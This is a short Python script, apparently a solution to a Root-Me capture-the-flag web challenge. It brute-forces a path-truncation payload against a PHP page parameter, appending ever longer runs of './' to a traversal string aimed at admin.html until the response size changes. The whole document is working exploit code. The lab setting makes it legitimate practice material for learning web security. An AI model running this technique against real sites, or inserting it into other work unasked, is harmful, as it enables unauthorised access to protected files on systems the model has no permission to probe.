import requests

path = ""
add_str = "./"
count = 1

def gen_path(n):
	return add_str*n

while True:
	url = "http://challenge01.root-me.org/web-serveur/ch35/index.php?page=zzz/../admin.html/%s" % (gen_path(count))
	count += 1
	print url
	print count
	r = requests.get(url)
	content = r.content
	if len(content) != 504:
		print content
		break